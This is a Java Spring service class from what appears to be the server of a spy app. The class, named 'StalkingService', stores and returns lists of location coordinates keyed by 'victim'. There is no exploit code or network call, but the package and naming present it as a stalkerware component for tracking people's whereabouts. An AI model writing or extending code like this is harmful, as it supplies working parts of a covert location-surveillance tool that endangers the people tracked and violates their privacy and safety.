/*
 * Copyright (c) 2018. AK
 */

package com.spyapp.server.core.beans.services;

import com.spyapp.server.core.beans.entities.Cordinates;
import org.springframework.stereotype.Service;

import java.util.HashMap;
import java.util.LinkedList;
import java.util.Map;

@Service
public class StalkingService {

    private Map<String, LinkedList<Cordinates>> victimLinkedListMap;

    public StalkingService() {
        victimLinkedListMap = new HashMap<>();
    }

    private void addVictimToMap(String victim) {
        this.victimLinkedListMap.put(victim, new LinkedList<>());
    }

    public void addCordinatesToMap(String victim, Cordinates cordinates) {

        if (this.victimLinkedListMap.get(victim) == null) {
            addVictimToMap(victim);
        }
        this.victimLinkedListMap.get(victim).add(cordinates);
    }

    public LinkedList<Cordinates> getCordinatesOfVictim(String victim) {
        return this.victimLinkedListMap.get(victim);
    }

    @Override
    public String toString() {
        StringBuilder stringBuilder = new StringBuilder();

        for (Map.Entry<String, LinkedList<Cordinates>> entry :
                victimLinkedListMap.entrySet()) {
            entry.getValue().forEach(v -> {
                stringBuilder.append(v.toString());
            });
        }
        return stringBuilder.toString();
    }
}
